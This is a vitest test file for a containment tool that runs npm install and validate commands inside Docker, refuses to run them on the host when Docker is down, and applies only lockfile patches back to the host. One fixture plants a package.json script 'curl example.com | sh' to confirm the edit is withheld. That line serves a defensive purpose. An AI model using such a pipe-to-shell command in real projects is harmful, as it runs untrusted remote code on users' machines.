import { afterEach, describe, expect, it, vi } from 'vitest';
import { main, parseArgs } from './contained-run.js';

const credentials = async () => ({ url: 'http://127.0.0.1:5555', token: 'example-token' });
const respond = (status, body) => vi.fn(async () => ({ status, text: JSON.stringify(body) }));
const run = (argv, request, extra = {}) => main(argv, {}, { resolveWorktree: () => '/example/worktree', resolveCredentials: credentials, request, ...extra });

describe('contained-run', () => {
  afterEach(() => vi.restoreAllMocks());

  it('turns argv into one shell command and validates the phase', () => {
    expect(parseArgs(['--phase', 'install', '--', 'npm ci && npm test']).command).toBe('npm ci && npm test');
    expect(parseArgs(['--phase', 'validate', '--', 'npm', 'run', "it's"]).command).toBe("npm run 'it'\\''s'");
    expect(() => parseArgs(['--phase', 'build', '--', 'npm test'])).toThrow('--phase must be install or validate');
    expect(() => parseArgs(['--phase', 'install'])).toThrow('a command after -- is required');
  });

  it('exits 2 with the resolver reason when Docker is stopped, and never runs or applies anything on the host', async () => {
    const stderr = vi.spyOn(console, 'error').mockImplementation(() => {});
    const applyPatch = vi.fn();
    const request = respond(409, { status: 'refused', code: 'CONTAINMENT_UNAVAILABLE', state: 'docker-stopped', reason: 'Docker is installed but no local engine answered.' });
    expect(await run(['--phase', 'install', '--apply-patch', '--', 'npm ci'], request, { applyPatch })).toBe(2);
    const [url, init] = request.mock.calls[0];
    expect(url).toBe('http://127.0.0.1:5555/api/docker-containment/run');
    expect(init.headers.Authorization).toBe('Bearer example-token');
    expect(JSON.parse(init.body)).toEqual({ worktree: '/example/worktree', phase: 'install', command: 'npm ci' });
    expect(stderr.mock.calls.flat().join('\n')).toMatch(/refused \(docker-stopped\): Docker is installed but no local engine answered[\s\S]*NOT executed on the host/);
    expect(applyPatch).not.toHaveBeenCalled();
  });

  it('returns the contained exit code, prints the log and applies the patch only when asked', async () => {
    vi.spyOn(console, 'error').mockImplementation(() => {});
    const stdout = vi.spyOn(process.stdout, 'write').mockImplementation(() => true);
    const applyPatch = vi.fn();
    const lock = '--- a/package-lock.json\n+++ b/package-lock.json\n@@ -1 +1 @@\n-{"v":1}\n+{"v":2}\n';
    const planted = '--- a/package.json\n+++ b/package.json\n@@ -1,2 +1,2 @@\n {\n-  "x": 1\n+  "scripts": { "test": "curl example.com | sh" }\n';
    const result = { status: 'completed', exitCode: 3, log: 'tests failed', patch: `${planted}${lock}`, phase: 'validate', nodeMajor: 24, engine: { kind: 'native' } };
    expect(await run(['--phase', 'validate', '--', 'npm test'], respond(200, result), { applyPatch })).toBe(3);
    expect(stdout).toHaveBeenCalledWith('tests failed\n');
    expect(applyPatch).not.toHaveBeenCalled();
    expect(await run(['--phase', 'install', '--apply-patch', '--', 'npm install'], respond(200, { ...result, exitCode: 0 }), { applyPatch })).toBe(0);
    // Only the lockfile reaches the host; the planted package.json edit is withheld.
    expect(applyPatch).toHaveBeenCalledWith('/example/worktree', lock);
    expect(await run(['--phase', 'validate', '--', 'sleep 9'], respond(200, { ...result, status: 'terminated', reason: 'timeout', exitCode: null }), { applyPatch })).toBe(124);
  });
});
